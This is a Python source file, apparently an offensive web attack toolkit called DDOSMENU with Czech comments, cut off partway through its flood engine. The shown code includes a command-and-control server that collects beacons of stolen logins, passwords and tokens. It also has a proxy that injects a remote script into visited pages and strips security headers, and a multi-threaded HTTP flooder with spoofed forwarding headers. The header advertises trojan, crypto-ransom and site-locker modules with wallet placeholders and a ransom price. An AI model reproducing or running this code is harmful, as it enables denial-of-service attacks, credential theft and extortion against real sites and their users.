#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DDOSMENU v5.0 - all-in-one web attack toolkit
--------------------------------------------------------------
Real DDoS · Real DoS · Trojan · InjectWEB + Proxy · CryptoTrojan · WebLocker
100% standard library - no pip, no dependencies.

    python ddosmenu.py          # menu
    python ddosmenu.py s        # selftest (overi, ze vse funguje)
    python ddosmenu.py 1        # rovnou DDoS
    python ddosmenu.py --c2     # jen C2 server
    python ddosmenu.py --proxy  # C2 + injection proxy
    python ddosmenu.py --watch  # live tail beaconu

License: MIT
"""

import contextlib
import csv
import ftplib
import gzip
import hashlib
import html as htmlmod
import http.cookiejar
import io
import json
import mimetypes
import multiprocessing as mp
import os
import random
import re
import shutil
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

VERSION = "5.0"

# --------------------------------------------------------------------------- #
#  terminal, barvy, unicode
# --------------------------------------------------------------------------- #
if os.name == "nt":
    os.system("")
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

try:
    UNICODE = "utf" in (sys.stdout.encoding or "").lower()
except Exception:
    UNICODE = False

NO_COLOR = ("--no-color" in sys.argv) or bool(os.environ.get("NO_COLOR"))
IS_TTY = sys.stdout.isatty()
ANSI = re.compile(r"\033\[[0-9;]*m")
RESET = "\033[0m"


def _mk(code):
    def f(s):
        return s if NO_COLOR else "\033[%sm%s%s" % (code, s, RESET)
    return f


THEMES = {
    "green":   ("92", "96", "95", "93", "91", "32"),
    "cyan":    ("96", "92", "95", "93", "91", "36"),
    "amber":   ("93", "97", "95", "91", "91", "33"),
    "magenta": ("95", "96", "91", "93", "91", "35"),
    "mono":    ("97", "97", "97", "97", "97", "90"),
}
grn_ = _mk("92")
cya_ = _mk("96")
mag_ = _mk("95")
yel_ = _mk("93")
red_ = _mk("91")
dgr_ = _mk("32")
whi_ = _mk("97")
b_ = _mk("1")
dim_ = _mk("2")
BOX_COL = "\033[92m"


def apply_theme(name):
    global grn_, cya_, mag_, yel_, red_, dgr_, BOX_COL
    t = THEMES.get(name) or THEMES["green"]
    grn_, cya_, mag_, yel_, red_, dgr_ = [_mk(x) for x in t[:6]]
    BOX_COL = "\033[%sm" % t[0]


def f256(rgb, s):
    if NO_COLOR:
        return s
    r, g, b = rgb
    return "\033[38;5;%dm%s%s" % (16 + 36 * (r // 51) + 6 * (g // 51) + (b // 51), s, RESET)


def vlen(s):
    return len(ANSI.sub("", s))


def term_width():
    try:
        return min(shutil.get_terminal_size((92, 24)).columns, 86)
    except Exception:
        return 86


def log(tag, msg, col=None):
    print((col or grn_)("[" + tag + "]") + " " + msg)


def ok(m):
    log("+", m, grn_)


def info(m):
    log("*", m, cya_)


def warn(m):
    log("!", m, yel_)


def err(m):
    log("-", m, red_)


def act(m):
    log(">", m, mag_)


def hr(title=""):
    w = term_width()
    if title:
        print("\n" + dgr_("-" * w))
        print("  " + b_(grn_(title.upper())))
        print(dgr_("-" * w))
    else:
        print(dgr_("-" * w))


def box(lines, title=None, col=None, double=False):
    col = col or BOX_COL
    if NO_COLOR:
        col = ""
    lines = [str(x) for x in lines]
    inner = max([vlen(x) for x in lines] + ([vlen(title)] if title else [0])) + 2
    inner = max(inner, 38)
    if UNICODE:
        s = ("╔", "╗", "╚", "╝", "═", "║", "╠", "╣") if double else \
            ("┌", "┐", "└", "┘", "─", "│", "├", "┤")
    else:
        s = ("+", "+", "+", "+", "=", "|", "+", "+") if double else \
            ("+", "+", "+", "+", "-", "|", "+", "+")
    tl, tr, bl, br, hz, vt, ml, mr = s
    e = RESET if not NO_COLOR else ""
    out = [col + tl + hz * inner + tr + e]
    if title:
        out.append(col + vt + e + " " + b_(title) + " " * max(0, inner - vlen(title) - 1) + col + vt + e)
        out.append(col + ml + hz * inner + mr + e)
    for l in lines:
        out.append(col + vt + e + " " + l + " " * max(0, inner - vlen(l) - 1) + col + vt + e)
    out.append(col + bl + hz * inner + br + e)
    return "\n".join(out)


def kv(key, val, w=16):
    return dim_(key.ljust(w)) + str(val)


FRAMES = ["|", "/", "-", "\\"]


@contextlib.contextmanager
def spinning(text):
    stop = threading.Event()

    def run():
        i = 0
        while not stop.is_set():
            sys.stdout.write("\r  " + cya_(FRAMES[i % 4]) + " " + text + "   ")
            sys.stdout.flush()
            i += 1
            time.sleep(0.08)
    t = threading.Thread(target=run, daemon=True)
    t.start()
    try:
        yield
    finally:
        stop.set()
        t.join(timeout=0.6)
        sys.stdout.write("\r" + " " * (vlen(text) + 10) + "\r")
        sys.stdout.flush()


def prog(i, total, prefix="", width=32):
    r = i / max(total, 1)
    f = int(width * r)
    ch = "█" if UNICODE else "#"
    em = "░" if UNICODE else "-"
    sys.stdout.write("\r  " + grn_(ch * f) + dgr_(em * (width - f)) +
                     "  %3d%%  %s" % (int(r * 100), prefix[:34]))
    sys.stdout.flush()
    if i >= total:
        print()


def spark(values, width=48):
    if not values:
        return ""
    v = values[-width:]
    mx = max(v) or 1
    if UNICODE:
        blocks = "▁▂▃▄▅▆▇█"
        return "".join(blocks[min(7, int(x / mx * 7.99))] for x in v)
    blocks = ".:-=+*#@"
    return "".join(blocks[min(7, int(x / mx * 7.99))] for x in v)


def ask(prompt, default=""):
    d = dim_(" [%s]" % default) if default else ""
    try:
        v = input(grn_("  >> ") + prompt + d + grn_(": ")).strip()
    except EOFError:
        v = ""
    return v or default


def ask_int(prompt, default):
    while True:
        try:
            return int(ask(prompt, str(default)))
        except ValueError:
            err("zadej cislo")


def ask_float(prompt, default):
    while True:
        try:
            return float(ask(prompt, str(default)).replace(",", "."))
        except ValueError:
            err("zadej cislo")


def ask_yes(prompt, default=True):
    return ask(prompt + dim_(" (y/n)"), "y" if default else "n").lower().startswith("y")


def pause():
    try:
        input(dim_("\n  -- Enter --"))
    except EOFError:
        pass


def num(n):
    return "{:,}".format(int(n)).replace(",", " ")


def human(n):
    n = float(n)
    for u in ("B", "kB", "MB", "GB", "TB"):
        if n < 1024:
            return "%.1f %s" % (n, u)
        n /= 1024.0
    return "%.1f PB" % n


def hms(sec):
    return time.strftime("%H:%M:%S", time.gmtime(int(sec)))


# --------------------------------------------------------------------------- #
#  konfigurace
# --------------------------------------------------------------------------- #
HERE = os.path.dirname(os.path.abspath(__file__))
ART = os.path.join(HERE, "ddosmenu_artifacts")
CERT_DIR = os.path.join(HERE, "ddosmenu_certs")
CONF_FILE = os.path.join(HERE, "ddosmenu_config.json")
BEACON_LOG = os.path.join(ART, "beacons.log")
BEACON_JSON = os.path.join(ART, "beacons.jsonl")
os.makedirs(ART, exist_ok=True)
os.makedirs(CERT_DIR, exist_ok=True)

DEFAULT_CONF = {
    "c2_host": "", "c2_port": 8080, "c2_scheme": "", "proxy_port": 9000,
    "wallet_btc": "bc1qCHANGEme0000000000000000000000000000000",
    "wallet_eth": "0xCHANGEme0000000000000000000000000000000000",
    "wallet_ltc": "LCHANGEme00000000000000000000000000",
    "price": "0.05 BTC", "tag": "web1", "theme": "green", "beep": True,
}


def load_conf():
    cfg = dict(DEFAULT_CONF)
    if os.path.exists(CONF_FILE):
        try:
            with open(CONF_FILE, "r", encoding="utf-8") as f:
                cfg.update(json.load(f))
        except Exception:
            pass
    return cfg


def save_conf(cfg):
    with open(CONF_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2, ensure_ascii=False)


CONF = load_conf()
apply_theme(CONF.get("theme", "green"))

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
]
_UCTX = ssl._create_unverified_context()


def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def has_cert():
    return (os.path.isfile(os.path.join(CERT_DIR, "cert.pem")) and
            os.path.isfile(os.path.join(CERT_DIR, "key.pem")))


def c2_scheme():
    return CONF.get("c2_scheme") or ("https" if has_cert() else "http")


def c2_base():
    return "%s://%s:%d" % (c2_scheme(), CONF.get("c2_host") or local_ip(), int(CONF["c2_port"]))


def write_art(name, content):
    p = os.path.join(ART, name)
    with open(p, "w", encoding="utf-8") as f:
        f.write(content)
    return p


def http_get(url, timeout=8, headers=None):
    h = {"User-Agent": random.choice(UAS), "Accept": "*/*"}
    if headers:
        h.update(headers)
    return urllib.request.urlopen(urllib.request.Request(url, headers=h),
                                  timeout=timeout, context=_UCTX)


def rand_ip():
    return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))


# --------------------------------------------------------------------------- #
#  banner (kompaktni)
# --------------------------------------------------------------------------- #
BANNER_U = r"""
 ██████╗ ██████╗  ██████╗ ███████╗███╗   ███╗███████╗███╗   ██╗██╗   ██╗
 ██╔══██╗██╔══██╗██╔═══██╗██╔════╝████╗ ████║██╔════╝████╗  ██║██║   ██║
 ██║  ██║██║  ██║██║   ██║███████╗██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║
 ██║  ██║██║  ██║██║   ██║╚════██║██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║
 ██████╔╝██████╔╝╚██████╔╝███████║██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝
"""

BANNER_A = r"""
 ____  ____   ___  ____  __  __ _____ _   _ _   _
|  _ \|  _ \ / _ \/ ___||  \/  | ____| \ | | | | |
| | | | | | | | | \___ \| |\/| |  _| |  \| | | | |
| |_| | |_| | |_| |___) | |  | | |___| |\  | |_| |
|____/|____/ \___/|____/|_|  |_|_____|_| \_|\___/
"""


def print_banner():
    lines = (BANNER_U if UNICODE else BANNER_A).strip("\n").split("\n")
    n = max(1, len(lines) - 1)
    for i, ln in enumerate(lines):
        t = i / n
        print(f256((0, 255, int(130 + 120 * t)), ln))
    print("  " + dgr_("v%s" % VERSION) + dim_("  ·  web attack toolkit  ·  python 3.7+  ·  no deps"))


def boot(quick=False):
    if quick:
        return
    steps = [
        ("jadro", "ddosmenu.core"),
        ("konfigurace", CONF_FILE),
        ("artefakty", ART),
        ("raw sockety", "AF_INET / AF_INET6"),
        ("c2 + proxy", "http.server"),
    ]
    for what, detail in steps:
        sys.stdout.write("  " + grn_("[*]") + " " + what.ljust(14) + dim_(detail) + " ")
        sys.stdout.flush()
        time.sleep(0.04)
        print(grn_("[ok]"))
    print()


# --------------------------------------------------------------------------- #
#  C2 server
# --------------------------------------------------------------------------- #
_LOG_LOCK = threading.Lock()
STATS = {"total": 0, "tags": {}, "types": {}, "creds": 0}
SUPPRESS = {"on": False}


def record(payload, ip, label="/beacon"):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        obj = json.loads(payload)
        pretty = json.dumps(obj, indent=2, ensure_ascii=False)
    except Exception:
        obj = payload
        pretty = str(payload)
    with _LOG_LOCK:
        with open(BEACON_LOG, "a", encoding="utf-8") as f:
            f.write("\n===== %s  from %s  %s =====\n%s\n" % (ts, ip, label, pretty))
        try:
            with open(BEACON_JSON, "a", encoding="utf-8") as f:
                f.write(json.dumps({"ts": ts, "ip": ip, "kind": label, "data": obj},
                                   ensure_ascii=False) + "\n")
        except Exception:
            pass
    STATS["total"] += 1
    kind = "?"
    if isinstance(obj, dict):
        kind = str(obj.get("type", "?"))
        STATS["types"][kind] = STATS["types"].get(kind, 0) + 1
        tg = str(obj.get("tag", "?"))
        STATS["tags"][tg] = STATS["tags"].get(tg, 0) + 1
        if kind in ("LOGIN", "PASSWORD", "FORM"):
            STATS["creds"] += 1
    if SUPPRESS["on"]:
        return
    if CONF.get("beep"):
        sys.stdout.write("\a")
    col = {"LOGIN": red_, "PASSWORD": red_, "PHOTO": mag_, "FILE": mag_,
           "TOKEN": yel_, "CRYPTO_PAGE": yel_}.get(kind, grn_)
    print("\n" + col("  >> BEACON") + dim_("  %s  z %s  " % (ts, ip)) + col("[" + kind + "]"))
    if isinstance(obj, dict):
        for k, v in obj.items():
            sv = str(v)
            if len(sv) > 116:
                sv = sv[:116] + "..."
            print("     " + dim_(k) + ": " + sv)
    else:
        print("     " + pretty[:400])


def load_beacons():
    out = []
    if os.path.exists(BEACON_JSON):
        with open(BEACON_JSON, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                try:
                    out.append(json.loads(line))
                except Exception:
                    pass
    return out


def dash_html():
    rows = load_beacons()[-250:]
    p = ["<!doctype html><meta charset='utf-8'><title>C2 :: ddosmenu</title><style>",
         "body{background:#050806;color:#8fff9e;font:13px/1.5 monospace;padding:18px;margin:0}",
         "h1{color:#00ff88;letter-spacing:4px;font-size:20px}",
         ".s{display:flex;gap:12px;flex-wrap:wrap;margin:12px 0 20px}",
         ".s div{border:1px solid #0f4;padding:8px 14px;border-radius:6px;background:#08120c}",
         ".k{color:#00e0ff}.v{color:#c8ffd4;word-break:break-all}",
         ".r{border-left:3px solid #0f4;padding:8px 12px;margin:10px 0;background:#08120c;border-radius:0 6px 6px 0}",
         ".r.LOGIN,.r.PASSWORD{border-color:#ff3b3b}.r.PHOTO,.r.FILE{border-color:#c04bff}",
         ".t{color:#5a8;font-size:11px}.f{margin:3px 0}.f .k{display:inline-block;min-width:110px}",
         "img{max-width:250px;border:1px solid #0f4;border-radius:4px;margin-top:6px}",
         "pre{white-space:pre-wrap;color:#9fd;margin:4px 0}</style>"]
    p.append("<h1>&gt;&gt; DDOSMENU C2 &lt;&lt;</h1>")
    p.append("<div class='s'><div>beacony: <b>%d</b></div><div>loginy: <b>%d</b></div>"
             "<div>tagy: <b>%s</b></div><div>typy: <b>%s</b></div><div>c2: <b>%s</b></div></div>"
             % (STATS["total"], STATS["creds"], htmlmod.escape(str(STATS["tags"])),
                htmlmod.escape(str(STATS["types"])), htmlmod.escape(c2_base())))
    for r in reversed(rows):
        d = r.get("data")
        kind = str(d.get("type", "?")) if isinstance(d, dict) else "?"
        p.append("<div class='r %s'><div class='t'>%s &nbsp; %s &nbsp; %s</div>"
                 % (htmlmod.escape(kind), r.get("ts", ""), htmlmod.escape(r.get("ip", "")),
                    htmlmod.escape(kind)))
        if isinstance(d, dict):
            for k, v in d.items():
                sv = str(v)
                if k == "data" and sv.startswith("data:image"):
                    p.append("<div class='f'><span class='k'>%s</span><img src='%s'></div>"
                             % (htmlmod.escape(k), sv))
                elif len(sv) > 90:
                    p.append("<div class='f'><span class='k'>%s</span><pre>%s</pre></div>"
                             % (htmlmod.escape(k), htmlmod.escape(sv)))
                else:
                    p.append("<div class='f'><span class='k'>%s</span><span class='v'>%s</span></div>"
                             % (htmlmod.escape(k), htmlmod.escape(sv)))
        else:
            p.append("<pre>%s</pre>" % htmlmod.escape(str(d)))
        p.append("</div>")
    p.append("<meta http-equiv='refresh' content='3'>")
    return "\n".join(p).encode("utf-8")


class _Srv(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True


class C2Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "ddosmenu-c2"

    def log_message(self, *a):
        pass

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Cache-Control", "no-store")

    def _reply(self, code, body=b"", ctype="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self._cors()
        self.end_headers()
        if body:
            self.wfile.write(body)

    def do_OPTIONS(self):
        self._reply(204)

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path in ("/dash", "/", ""):
            return self._reply(200, dash_html(), "text/html; charset=utf-8")
        if path == "/beacons":
            d = open(BEACON_LOG, "rb").read() if os.path.exists(BEACON_LOG) else b""
            return self._reply(200, d, "text/plain; charset=utf-8")
        fn = os.path.join(ART, os.path.basename(path))
        if os.path.isfile(fn):
            return self._reply(200, open(fn, "rb").read(),
                               mimetypes.guess_type(fn)[0] or "application/octet-stream")
        if path in ("/beacon", "/b", "/pixel.gif"):
            record(urllib.parse.urlparse(self.path).query, self.client_address[0], "GET")
            if path.endswith(".gif"):
                return self._reply(200, b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff"
                                        b"!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00"
                                        b"\x01\x00\x00\x02\x02D\x01\x00;", "image/gif")
            return self._reply(200, b'{"ok":true}')
        return self._reply(404, b'{"error":"nf"}')

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n) if n else b""
        record(raw.decode("utf-8", "replace"), self.client_address[0],
               urllib.parse.urlparse(self.path).path)
        return self._reply(200, b'{"ok":true}')


C2 = {"srv": None}


def c2_start(port=None, quiet=False):
    if C2["srv"]:
        return
    if port:
        CONF["c2_port"] = int(port)
    srv = _Srv(("0.0.0.0", int(CONF["c2_port"])), C2Handler)
    if c2_scheme() == "https" and has_cert():
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(os.path.join(CERT_DIR, "cert.pem"), os.path.join(CERT_DIR, "key.pem"))
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    C2["srv"] = srv
    if not quiet:
        ok("C2 " + b_("ONLINE") + " na " + cya_(c2_base()))
        info("dashboard: " + b_(cya_(c2_base() + "/dash")))


def c2_stop():
    if C2["srv"]:
        C2["srv"].shutdown()
        C2["srv"].server_close()
        C2["srv"] = None


def gen_cert():
    if has_cert():
        return ok("cert uz existuje")
    if not shutil.which("openssl"):
        return warn("openssl nenalezen -> zustavam na http")
    cmd = ("openssl req -x509 -newkey rsa:2048 -nodes -days 3650 -keyout %s -out %s -subj /CN=ddosmenu"
           % (os.path.join(CERT_DIR, "key.pem"), os.path.join(CERT_DIR, "cert.pem")))
    with spinning("generuji self-signed cert"):
        rc = os.system(cmd + " 2>/dev/null")
    if rc == 0:
        CONF["c2_scheme"] = "https"
        save_conf(CONF)
        ok("cert hotov -> C2 pojede na HTTPS")
        warn("jednou otevri " + cya_(c2_base()) + " a prijmi cert")
    else:
        err("openssl selhal")


# --------------------------------------------------------------------------- #
#  injection proxy
# --------------------------------------------------------------------------- #
class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


_CJ = http.cookiejar.CookieJar()
_OPENER = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(_CJ),
    urllib.request.HTTPSHandler(context=_UCTX),
    _NoRedirect())

ATTR_RE = re.compile(r'(?i)\b(href|src|action|poster|data-src|data-href)\s*=\s*(["\'])(.*?)\2')


def _prefix_url(u, scheme, host, base):
    if not u:
        return u
    low = u.lower()
    if low.startswith(("javascript:", "mailto:", "tel:", "data:", "blob:", "about:", "#")):
        return u
    frag = ""
    if "#" in u:
        u, frag = u.split("#", 1)
        frag = "#" + frag
    if u.startswith("//"):
        new = "/" + scheme + "/" + u[2:]
    else:
        full = u if low.startswith(("http://", "https://")) else urllib.parse.urljoin(base, u)
        p = urllib.parse.urlsplit(full)
        if not p.netloc:
            return u + frag
        new = "/" + p.scheme + "/" + p.netloc + (p.path or "/")
        if p.query:
            new += "?" + p.query
    return new + frag


def rewrite_html(html, scheme, host, base):
    def rep(m):
        a, q, val = m.group(1), m.group(2), m.group(3)
        return "%s=%s%s%s" % (a, q, _prefix_url(val, scheme, host, base), q)
    html = ATTR_RE.sub(rep, html)
    inj = '<script src="%s/inject.js" data-dd="1"></script>' % c2_base()
    if re.search(r"(?i)</body\s*>", html):
        html = re.sub(r"(?i)</body\s*>", inj + "</body>", html, count=1)
    elif re.search(r"(?i)</html\s*>", html):
        html = re.sub(r"(?i)</html\s*>", inj + "</html>", html, count=1)
    else:
        html += inj
    return html


LANDING = """<!doctype html><meta charset="utf-8"><title>ddosmenu proxy</title>
<style>body{background:#050806;color:#8fff9e;font:14px monospace;padding:60px}
h1{color:#0f8;letter-spacing:4px}input{background:#08120c;border:1px solid #0f4;color:#0f8;
padding:12px;width:58%;font:14px monospace;border-radius:6px}
button{background:#0f4;border:0;color:#04120a;padding:12px 22px;font:bold 14px monospace;
border-radius:6px;cursor:pointer}small{color:#4a7}</style>
<h1>&gt;&gt; DDOSMENU PROXY &lt;&lt;</h1>
<p>zadej adresu - stranka se nacte i s trojanem:</p>
<form action="/go" method="get">
 <input name="u" placeholder="https://example.com" autofocus>
 <button>INJECT &amp; OPEN</button></form>
<p><small>odkazy, formulare i cookies jdou pres proxy &middot; data na %s/dash</small></p>"""


class ProxyHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "ddosmenu-proxy"

    def log_message(self, *a):
        pass

    def _send(self, code, body=b"", ctype="text/html; charset=utf-8", extra=None):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        for k, v in (extra or []):
            self.send_header(k, v)
        self.end_headers()
        if body:
            self.wfile.write(body)

    def _redirect(self, loc):
        self._send(302, b"", "text/plain", [("Location", loc)])

    def do_GET(self):
        self._go("GET")

    def do_HEAD(self):
        self._go("HEAD")

    def do_POST(self):
        self._go("POST")

    def do_PUT(self):
        self._go("PUT")

    def do_PATCH(self):
        self._go("PATCH")

    def do_DELETE(self):
        self._go("DELETE")

    def do_OPTIONS(self):
        self._go("OPTIONS")

    def _go(self, method):
        if self.path.startswith("/go"):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            u = (q.get("u") or [""])[0].strip()
            if not u:
                return self._redirect("/")
            if "://" not in u:
                u = "https://" + u
            p = urllib.parse.urlsplit(u)
            return self._redirect("/%s/%s%s" % (p.scheme, p.netloc, p.path or "/"))
        m = re.match(r"^/(https?)/([^/]+)(/.*)?$", self.path)
        if not m:
            return self._send(200, (LANDING % c2_base()).encode())
        scheme, host, rest = m.group(1), m.group(2), (m.group(3) or "/")
        target = "%s://%s%s" % (scheme, host, rest)
        body = None
        n = int(self.headers.get("Content-Length") or 0)
        if n:
            body = self.rfile.read(n)
        if method in ("POST", "PUT", "PATCH") and body is None:
            body = b""
        hdrs = {}
        for k, v in self.headers.items():
            if k.lower() in ("host", "connection", "accept-encoding", "content-length",
                             "cookie", "referer", "origin", "proxy-connection"):
                continue
            hdrs[k] = v
        hdrs["Accept-Encoding"] = "identity"
        hdrs["Referer"] = target
        try:
            req = urllib.request.Request(target, data=body, headers=hdrs, method=method)
            try:
                resp = _OPENER.open(req, timeout=30)
            except urllib.error.HTTPError as e:
                resp = e
            code = getattr(resp, "status", None) or resp.code
            rhead = resp.headers
            data = resp.read()
        except Exception as e:
            return self._send(200, ("<h3>proxy chyba</h3><pre>%s</pre>"
                                    % htmlmod.escape(str(e))).encode())
        if (rhead.get("Content-Encoding") or "").lower() == "gzip":
            try:
                data = gzip.decompress(data)
            except Exception:
                pass
        ctype = rhead.get("Content-Type", "application/octet-stream")
        if "text/html" in ctype.lower():
            txt = data.decode("utf-8", "replace")
            txt = rewrite_html(txt, scheme, host, target)
            data = txt.encode("utf-8")
            if "charset" not in ctype.lower():
                ctype += "; charset=utf-8"
        self.send_response(code)
        for k, v in rhead.items():
            if k.lower() in ("content-length", "content-encoding", "transfer-encoding",
                             "connection", "content-security-policy", "x-frame-options",
                             "strict-transport-security", "set-cookie", "location", "content-type"):
                continue
            self.send_header(k, v)
        self.send_header("Content-Type", ctype)
        for ck in (rhead.get_all("Set-Cookie") or []):
            ck = re.sub(r"(?i);\s*domain=[^;]*", "", ck)
            ck = re.sub(r"(?i);\s*secure", "", ck)
            self.send_header("Set-Cookie", ck)
        loc = rhead.get("Location")
        if loc:
            self.send_header("Location", _prefix_url(loc, scheme, host, target))
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        if method != "HEAD":
            self.wfile.write(data)


PROXY = {"srv": None}


def proxy_start(port=None):
    if PROXY["srv"]:
        return
    if port:
        CONF["proxy_port"] = int(port)
    srv = _Srv(("127.0.0.1", int(CONF["proxy_port"])), ProxyHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    PROXY["srv"] = srv
    ok("proxy " + b_("ONLINE") + " na " + cya_("http://127.0.0.1:%d" % CONF["proxy_port"]))


def proxy_stop():
    if PROXY["srv"]:
        PROXY["srv"].shutdown()
        PROXY["srv"].server_close()
        PROXY["srv"] = None


# --------------------------------------------------------------------------- #
#  DDOS engine
# --------------------------------------------------------------------------- #
PATHS = ["/", "/index.html", "/?", "/api", "/home", "/static/", "/favicon.ico",
         "/search?q=ddos", "/login", "/assets/", "/?v=1"]


def _code_idx(code):
    try:
        c = int(code)
    except Exception:
        return 5
    if c == 200:
        return 0
    if 200 <= c < 300:
        return 1
    if 300 <= c < 400:
        return 2
    if 400 <= c < 500:
        return 3
    if 500 <= c < 600:
        return 4
    return 5


def resolve_url(url, timeout=10):
    try:
        r = http_get(url, timeout=timeout)
        return r.geturl(), r.status
    except urllib.error.HTTPError as e:
        return e.geturl(), e.code
    except Exception:
        return url, 0


def baseline_latency(url, n=5):
    vals = []
    for _ in range(n):
        t0 = time.perf_counter()
        try:
            r = http_get(url, timeout=6)
            r.read(512)
            vals.append(time.perf_counter() - t0)
        except Exception:
            pass
    return (sum(vals) / len(vals)) if vals else 0.0


class Shared:
    def __init__(self):
        self.lock = mp.Lock()
        self.tot = mp.Value("Q", 0)
        self.ok = mp.Value("Q", 0)
        self.err = mp.Value("Q", 0)
        self.byt = mp.Value("Q", 0)
        self.lat = mp.Value("d", 0.0)
        self.codes = mp.Array("Q", 6)

    def add(self, tot, okn, errn, byt, lat, ci=-1):
        with self.lock:
            self.tot.value += tot
            self.ok.value += okn
            self.err.value += errn
            self.byt.value += byt
            self.lat.value += lat
            if ci >= 0:
                self.codes[ci] += 1

    def snap(self):
        return (self.tot.value, self.ok.value, self.err.value,
                self.byt.value, self.lat.value, list(self.codes))


class Flooder:
    def __init__(self, url, threads=400, method="GET", timeout=4.0,
                 keepalive=False, cachebust=True, randpath=True, processes=1,
                 quiet=False, xff=False):
        if "://" not in url:
            url = "http://" + url
        u = urllib.parse.urlparse(url)
        self.url = url
        self.host = u.hostname or "127.0.0.1"
        self.tls = (u.scheme == "https")
        self.port = u.port or (443 if self.tls else 80)
        self.host_header = self.host + ("" if self.port in (80, 443) else ":%d" % self.port)
        self.base_path = (u.path or "/") + (("?" + u.query) if u.query else "")
        self.threads = max(1, int(threads))
        self.method = method.upper()
        self.timeout = float(timeout)
        self.keepalive = keepalive
        self.cachebust = cachebust
        self.randpath = randpath
        self.processes = max(1, int(processes))
        self.quiet = quiet
        self.xff = xff

    def _request(self):
        p = self.base_path
        if self.randpath and random.random() < 0.4:
            p = random.choice(PATHS)
        if self.cachebust:
            p += ("&" if "?" in p else "?") + "x=%d" % random.randint(1, 2 ** 31)
        head = "%s %s HTTP/1.1\r\nHost: %s\r\n" % (self.method, p, self.host_header)
        head += "User-Agent: %s\r\n" % random.choice(UAS)
        head += "Accept: */*\r\nAccept-Encoding: gzip, deflate\r\n"
        head += "Cache-Control: no-cache\r\nPragma: no-cache\r\n"
        if self.xff:
            ip = rand_ip()
            head += "X-Forwarded-For: %s\r\nX-Real-IP: %s\r\n" % (ip, ip)
        head += "Connection: %s\r\n" % ("keep-alive" if self.keepalive else "close")
        body = b""
        if self.method in ("POST", "PUT"):
            body = b"d=" + os.urandom(random.randint(8, 48)).hex().encode()
            head += "Content-Type: application/x-www-form-urlencoded\r\n"
            head += "Content-Length: %d\r\n" % len(body)
        return (head + "\r\n").encode() + body

    @staticmethod
    def _read_response(s):
        buf = b""
        while b"\r\n\r\n" not in buf:
            c = s.recv(4096)
            if not c:
                return buf
            buf += c
        head, _, body = buf.partition(b"\r\n\r\n")
        if b"chunked" in head.lower():
            while b"0\r\n\r\n" not in body:
                c = s.recv(4096)
                if not c:
                    break
                body += c
            return head + body
        m = re.search(br"(?i)content-length:\s*(\d+)", head)
        need = int(m.group(1)) if m else 0
        while len(body) < need:
            c = s.recv(4096)
            if not c:
                break
            body += c
        return head + body

    def _worker(self, stop, sh, ctx):
        loc = [0, 0, 0, 0, 0.0]
        last = time.perf_counter()
        sock = None
        while not stop.is_set():
            ci = -1
            try:
                if sock is None:
                    sock = socket.create_connection((self.host, self.port), self.timeout)
                    if self.tls:
                        sock = ctx.wrap_socket(sock, server_hostname=self.host)
                t0 = time.perf_counter()
                sock.sendall(self._request())
                data = self._read_response(sock)
                dt = time.perf_counter() - t0
                if not self.keepalive:
                    sock.close()
                    sock = None
                loc[0] += 1
                if data[:5] == b"HTTP/":
                    loc[1] += 1
                    loc[3] += len(data)
                    loc[4] += dt
                    try:
                        ci = _code_idx(data.split(b" ", 2)[1])
                    except Exception:
                        ci = 5
                else:
                    loc[2] += 1
            except Exception:
